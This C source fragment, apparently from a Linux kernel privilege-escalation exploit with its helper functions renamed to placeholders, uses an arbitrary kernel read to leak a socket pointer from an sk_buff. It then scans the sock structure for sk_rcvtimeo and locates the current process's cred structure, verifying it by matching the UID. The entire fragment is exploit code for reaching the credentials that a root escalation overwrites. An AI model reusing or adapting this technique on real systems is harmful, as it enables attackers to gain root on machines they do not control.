#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  unsigned long uid_t ;

/* Variables and functions */
 unsigned long PHYS_OFFSET ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 unsigned long FUNC1 () ; 
 unsigned long FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 (char*,unsigned long,...) ; 
 int FUNC4 (unsigned long) ; 

__attribute__((used)) static unsigned long FUNC5() {
	uid_t uid = FUNC2();
	unsigned long skbuff = FUNC1();
	/*
	 * struct sk_buff {
	 *     [...24 byte offset...]
	 *     struct sock     *sk;
	 * };
	 *
	 */

	unsigned long sock_addr = FUNC4(skbuff + 24);
	FUNC3("skbuff => %llx\n", skbuff);
	FUNC3("Leaking sock struct from %llx\n", sock_addr);	
	if(sock_addr < PHYS_OFFSET){
		FUNC0("Failed to find Sock address from sk_buff.\n");
	}	
		
	/*
	 * scan forward for expected sk_rcvtimeo value.
	 *
	 * struct sock {
	 *    [...]
	 *    const struct cred      *sk_peer_cred; 
	 *    long                    sk_rcvtimeo;             
	 *  };
	 */
	for (int i = 0; i < 100; i++, sock_addr += 8) {
		if(FUNC4(sock_addr) == 0x7FFFFFFFFFFFFFFF) {
			unsigned long cred_struct = FUNC4(sock_addr - 8);
			if(cred_struct < PHYS_OFFSET) {
				continue;
			}
			
			unsigned long test_uid = (FUNC4(cred_struct + 8) & 0xFFFFFFFF);
			
			if(test_uid != uid) {
				continue;
			}
                        FUNC3("Sock->sk_rcvtimeo at offset %d\n", i * 8);
                        FUNC3("Cred structure at %llx\n", cred_struct);
			FUNC3("UID from cred structure: %d, matches the current: %d\n", test_uid, uid);
			
			return cred_struct;
		}
	}
	FUNC0("failed to find sk_rcvtimeo.\n");
}